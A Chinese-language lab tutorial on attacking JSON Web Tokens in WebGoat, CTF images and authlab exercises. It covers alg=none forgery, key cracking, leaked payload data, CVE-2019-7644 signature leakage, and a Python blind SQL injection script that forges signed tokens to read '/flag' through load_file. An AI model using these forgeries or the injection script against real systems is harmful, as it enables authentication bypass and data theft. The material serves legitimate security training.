[TOC]



# ==JWT漏洞实战==

教材内容

## JWT漏洞利用实战

### 1.空加密算法（cve-2015-9235）

#### 1.1 ctf-jwt-token

使用docker直接拉取环境进行测试

```
docker pull gluckzhang/ctf-jwt-tokendocker run --rm -p 8080:8080 gluckzhang/ctf-jwt-token
```

![image-20221212102635797](https://gitee.com/ymq_typroa/typroa/raw/main/202212161605570.png)

然后访问到主页，用admin/admin进行登陆的尝试

![image-20221212103651627](https://gitee.com/ymq_typroa/typroa/raw/main/202212161606164.png)

账号和密码不正确的话就会返回正确的账号和密码

![image-20221212103614984](https://gitee.com/ymq_typroa/typroa/raw/main/202212161606202.png)

然后使用

```
longz/gogogo
```

进行登录，就会返回登陆的jwt

![image-20221212115913032](https://gitee.com/ymq_typroa/typroa/raw/main/202212161607001.png)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjcwODE3NTI5Mjg2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDguMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjcwODE3NTI5fQ.D2N_u0PoSQhtRvqM_aSaocdzc98HQGqEitMYcFKlXBo
```

使用jwt.io 进行解码

![image-20221212121507403](https://gitee.com/ymq_typroa/typroa/raw/main/202212161607499.png)

可以看到是直接可以修改user的，使用python的jwt库进行修改生成新的jwt

```python
import jwt
payload = {  "auth": 1670817529286,  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",  "role": "admin",  "iat": 1670817529}
print(jwt.encode(payload,None,algorithm="none"))
```

修改后结果为

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE2NzA4MTc1MjksInJvbGUiOiJhZG1pbiIsImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYXV0aCI6MTY3MDgxNzUyOTI4Nn0.
```

在登陆longz用户之后刷新页面，将cookie中的token值修改为上边生成的jwt即可获得admin的权限

![image-20221212143017267](https://gitee.com/ymq_typroa/typroa/raw/main/202212161610650.png)

就可以找到我们的flag

#### 1.2 webgoat

使用docker拉取我们的webgoat镜像

```dockerfile
docker search webgoat
docker pull webgoat/webgoat-8.0:v8.1.0
docker pull webgoat/webwolf:v8.1.0
docker pull webgoat/goatandwolf:v8.1.0
docker images
docker run -d -p 8888:8888 -p 8080:8080 -p 9090:9090 webgoat/goatandwolf:v8.1.0
```

拉取成功之后访问我们的靶场

```
http://192.168.17.102:8080/WebGoat/start.mvc#lesson/JWT.lesson/
```

注册之后进行登陆，找到投票的靶场

```
http://192.168.12.99:8080/WebGoat/start.mvc#lesson/JWT.lesson/3
```

![image-20221213144555265](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161646455.png)

先是游客的权限不能进行投票，修改权限为Tom

![image-20221213144752870](https://gitee.com/ymq_typroa/typroa/raw/main/202212161646146.png)

点击垃圾桶重置投票，抓包可以看到用户使用的token

![image-20221213145121901](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161647054.png)

```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NzE3NzgyMTgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.BmE3sfNfU1GtKcdd0IobJUhIYjT8FtAF4NN045qacTW4hjT_srSxf2hGNb0bynsDEkO7QRSStBtpydF0iggT4w
```

![image-20221213145148841](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161647105.png)

admin改成true，alg改为none，即改掉加密算法

这里我们直接使用burpsuite里边的Json Token Attacker插件

抓包发送到Repeater，选择jws里边的alg为none，payload为”admin”:”true”

![image-20221213150353404](https://gitee.com/ymq_typroa/typroa/raw/main/202212161648050.png)

![image-20221213150406172](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161649917.png)

点击Update进行更新，然后放包

可以看到如果是普通用户的话会提示只有管理员可以重置

![image-20221213150519347](https://gitee.com/ymq_typroa/typroa/raw/main/202212161650953.png)

在使用了空加密算法之后就可以直接使用admin的权限了

![image-20221213150501486](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161650248.png)

### 2.密钥爆破

#### JWT_Cracking

```
靶场地址：https://authlab.digi.ninja/JWT_Cracking
工具地址：GitHub - brendan-rius/c-jwt-cracker
```

![image-20221207155451718](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161620526.png)

安装工具

```
https://github.com/brendan-rius/c-jwt-cracker
```

在make之前需要新安装这个库

```
apt-get install libssl-dev
```

编译好了之后直接使用

```
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NzA0NjMyNDQsImxldmVsIjoidXNlciIsInVzZXIiOiJqYXNwZXIifQ.JX2hwif1pZkocHIiZKj5nb3FubLgQaAvzqM5y1s4zxs
```

就可以破解我们jwt中的key

![image-20221208094054648](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161622086.png)

破解完key之后就可以使用key在jwt中进行修改了

![image-20221208100457377](https://gitee.com/ymq_typroa/typroa/raw/main/202212161623639.png)

只要在VERIFY SIGNATURE中加入我们的密钥就可以了

之后再填入发送我们就可以以woniu的用户名admin的权限进行登陆了

![image-20221208100533692](https://gitee.com/ymq_typroa/typroa/raw/main/202212161624116.png)

### 3.敏感信息泄露

#### Leaky JWT

```
https://authlab.digi.ninja/Leaky_JWT
```

![image-20221207121858574](https://gitee.com/ymq_typroa/typroa/raw/main/202212161627388.png)

上边提供的是加密的JWT的token，开发者如果把不必要的信息放在payload里边，那么解密的时候就可能获得用户的用户名和密码。我们将token放到解密的网站进行解密

```
https://tooltt.com/jwt-decode/
```

![image-20221207140807593](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161627163.png)

 可以看到用户名是admin，密码是经过md5加密的，就可以尝试使用解密网站进行解密2ac9cb7dc02b3c0083eb70898e549b63

```
https://www.cmd5.com/
```

![image-20221207141005487](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161628832.png)

找到用户名和密码

```
joe / Password1
```

![image-20221207141148974](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161628043.png)

就可以登陆成功

### 4.JWT中的sql注入

#### 网鼎杯js_on

```
靶场环境：ctfhub
```

在开启环境后进入到我们的首页，进去是一个登陆界面，使用admin/admin尝试登陆，发现登陆成功，是一个弱口令的登陆

![image-20221212165134232](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161630246.png)

登录之后找到了信息

```
这里是你的信息：key: xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6
```

通过抓包也可以看到是一个jwt的认证

![image-20221212165233682](https://gitee.com/ymq_typroa/typroa/raw/main/202212161632908.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJuZXdzIjoia2V5OiB4UnQqWU1EcXlDQ3hZeGk5YUBMZ2NHcG5tTTJYOGkmNiJ9.dS9Hn6gwXUhuDIFgnibizPvV2o1uiNqRn5QVNjTCWYg
```

使用jwt.io进行解密

![image-20221212165307357](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161633095.png)

直接使用python的jwt库修改payload部分的值

```python
import jwt
payload = {"user": "admin","news": "Woniu"}
key = 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6'
encoded_jwt = jwt.encode(payload,key,algorithm='HS256').decode('utf-8')
print(encoded_jwt)
```

修改的结果为

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuZXdzIjoiV29uaXUiLCJ1c2VyIjoiYWRtaW4ifQ.4iG_T-ieZNp64j4DZJFAnKH_2w3qD18S6QmwjbENNNA
```

![image-20221213095517305](https://gitee.com/ymq_typroa/typroa/raw/main/202212161634543.png)

可以看到修改成功，这个地方是可能存在sql注入的，我们可以尝试一下

```python
import jwt
payload = {"user": "admin' and 1=1#","news": "Woniu"}
key = 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6'
encoded_jwt = jwt.encode(payload,key,algorithm='HS256').decode('utf-8')
print(encoded_jwt)
```

得到的结果为

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuZXdzIjoiV29uaXUiLCJ1c2VyIjoiYWRtaW4nIGFuZCAxPTEjIn0.cRptcMG1xdZpRxtueQMjYE9AFoNFMRq5DfgL0Fb7Bdc
```

![image-20221213095749460](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161634052.png)

发现这个地方是做好了防护的，存在sql注入的可能性，尝试使用过滤符进行绕过

```python
import jwt
payload = {"user": "admin'/**/and/**/1=1#","news": "Woniu"}
key = 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6'
encoded_jwt = jwt.encode(payload,key,algorithm='HS256').decode('utf-8')
print(encoded_jwt)
```

得到的结果为

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuZXdzIjoiV29uaXUiLCJ1c2VyIjoiYWRtaW4nLyoqL2FuZC8qKi8xPTEjIn0.rqqrBFAdoGS-2fOD-lJdQRUzFTnt1Lo3mz_Y1_0sefo
```

![image-20221213100019001](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161635589.png)

可以看到得到的信息正常显示了，再使用1=2 看返回的结果是否相同

```python
import jwt
payload = {"user": "admin'/**/and/**/1=2#","news": "Woniu"}
key = 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6'
encoded_jwt = jwt.encode(payload,key,algorithm='HS256').decode('utf-8')
print(encoded_jwt)
```

得到的结果为

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuZXdzIjoiV29uaXUiLCJ1c2VyIjoiYWRtaW4nLyoqL2FuZC8qKi8xPTIjIn0.XePQAMIC7G3mh074wejy2jC2ijNeWzseV9ls8uzlgJ0
```

![image-20221213100046229](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161636767.png)

返回的结果是不一样的，所以是存在布尔盲注的

之后使用python编写脚本使用二分法得到flag即可

```python
# coding=utf-8
import jwt
import requests
import re

key = "xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6"
url = "http://challenge-9b5e1dc5aef1d62d.sandbox.ctfhub.com:10800/index.php"
payloadTmpl = "admin'/**/and/**/ascii(mid((se<a>lect/**/lo<a>ad_fi<a>le('/fl<a>ag')),{},1))>{}#"
def sql_jwt():    
	result = ""    
	for i in range(1,50):        
		min = 31        
		max = 127        
		while abs(max-min) > 1:            
			mid = (min + max)//2            
			payload = payloadTmpl.format(i,mid)            
			print(payload)            
			jwttoken = {                
				"user": payload,                
				"news": "hello"            
			}            
			payload = jwt.encode(jwttoken, key, algorithm='HS256').decode('utf-8')            
			cookies = dict(token=str(payload))            
			res = requests.get(url,cookies=cookies)            
			if re.findall("hello", res.text) != []:                
				min = mid            
			else:                
				max = mid        
		result += chr(max)        
		print(result)
                
if __name__ == "__main__":    
	sql_jwt()
```

![image-20221213100302257](https://gitee.com/ymq_typroa/typroa/raw/main/202212161637150.png)

### 5. cve-2019-7644

#### Auth1

```
CVE-2019-7644:低于1.0.4的所有Auth0-WCF-Service-JWT NuGet软件包版本均在JWT签名验证失败时发出的错误消息中包含有关预期JWT签名的敏感信息。此漏洞使攻击者可以使用此错误消息来获取任意JWT令牌的有效签名。这样，攻击者可以伪造令牌以绕过身份验证和授权机制。靶场地址：https://authlab.digi.ninja/Auth1
```

![image-20221213111636095](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161641588.png)

可以使用上边的jwt进行尝试登陆

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6InVzZXIiLCJ1c2VyIjoic2lkIn0.Hnpn5k6NtrXn8qvOuiSsFjXhAolQGn3TfmGBvA7EGTU
```

![image-20221213111718756](https://gitee.com/ymq_typroa/typroa/raw/main/202212161641622.png)

登陆进来的就是一个user权限的用户，在jwt.io里边对信息进行解密

![image-20221213111756479](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161641113.png)

将右边的user换成admin之后复制到靶场下边提交

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6ImFkbWluIiwidXNlciI6InNpZCJ9.9BimtJvIH0zI1HY6bTEcgErftlYqtU5G4d021xVd8YA
```

发现这个地方出现了报错信息

![image-20221213111840801](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161642255.png)

那上边的signature应该就是正确的，使用上边的前半部分替换掉jwt的后半部分

![image-20221213111942514](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/sunxinbo/202212161643139.png)

就可以看到是admin权限登陆，jwt利用成功